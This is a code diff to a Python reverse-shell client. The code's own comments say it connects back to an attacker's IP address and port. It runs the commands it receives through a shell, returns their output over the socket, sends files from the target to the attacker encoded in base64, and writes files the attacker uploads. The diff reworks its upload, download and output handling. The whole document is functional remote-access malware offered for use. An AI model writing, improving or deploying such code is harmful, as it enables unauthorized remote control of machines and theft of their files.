@@ -8,34 +8,37 @@ import base64
 HOST = "127.0.0.1"  # Replace with the attacker's IP address
 PORT = 4444  # Replace with the port the attacker is listening on
 
-# Function to execute commands on the target machine
+
 def execute_command(command):
-    try:
-        return subprocess.check_output(command, shell=True, text=True)
-    except subprocess.CalledProcessError:
-        return "[+] Invalid command [+]"
+    # Execute the command and return the result
+    return subprocess.run(command, shell=True, capture_output=True)
 
-def send_json(conn, data):
+
+def send_json(data):
     json_data = json.dumps(data)
-    conn.send(json_data.encode())
+    sock.send(json_data.encode())
 
-def receive_json(conn):
+
+def receive_json():
     json_data = ""
     while True:
         try:
-            json_data = json_data + conn.recv(1024).decode()
+            json_data += sock.recv(1024).decode()
             return json.loads(json_data)
         except ValueError:
             continue
 
-def write_file(path, content):
-    with open(path, "wb") as file:
-        file.write(base64.b64decode(content))
-        return "[+] Upload successful [+]"
 
 def read_file(path):
     with open(path, "rb") as file:
         return base64.b64encode(file.read()).decode()
+
+
+def write_file(path, content):
+    with open(path, "wb") as file:
+        file.write(base64.b64decode(content))
+        return "[+] Download successful [+]"
+
 
 # Create a socket object to connect back to the attacker
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -58,29 +61,34 @@ try:
         # Receive the command from the server
         command = sock.recv(1024).decode("utf-8").strip()
 
+        # Handle upload or download commands
+        if command.startswith("download"):
+            _, file_path = command.split(" ", 1)
+            try:
+                file_content = read_file(file_path)
+                send_json(file_content)
+            except Exception as e:
+                send_json(f"Error: {e}")
+            continue
+        elif command.startswith("upload"):
+            _, file_path = command.split(" ", 1)
+            content = receive_json()
+            try:
+                result = write_file(file_path, content)
+                sock.sendall(result.encode("utf-8"))
+            except Exception as e:
+                sock.sendall(f"Error: {e}".encode("utf-8"))
+            continue
+
         # Handle the 'km' command to completely disconnect
         if command.lower() == "km":
             sock.sendall("Disconnecting...\n".encode("utf-8"))
             sock.close()
             break
 
-        # Handle upload and download commands
-        if command.startswith("upload"):
-            command_data = receive_json(sock)
-            path = command_data[1]
-            file_content = command_data[2]
-            response = write_file(path, file_content)
-            send_json(sock, response)
-            continue
-        elif command.startswith("download"):
-            command_data = receive_json(sock)
-            path = command_data[1]
-            file_content = read_file(path)
-            send_json(sock, file_content)
-            continue
-
         # Handle the 'shell' command to enter the shell mode
         if command.lower() == "shell":
+            # Switch to the C:\ directory
             try:
                 os.chdir("C:\\")
                 in_shell_mode = True  # Enable shell mode
@@ -114,7 +122,7 @@ try:
 
             # Execute the received shell command
             output = execute_command(command)
-            sock.sendall(output.encode("utf-8"))
+            sock.sendall(output.stdout + output.stderr)
             continue
 
         # If not in shell mode, reject commands other than 'shell' or 'shell -d'
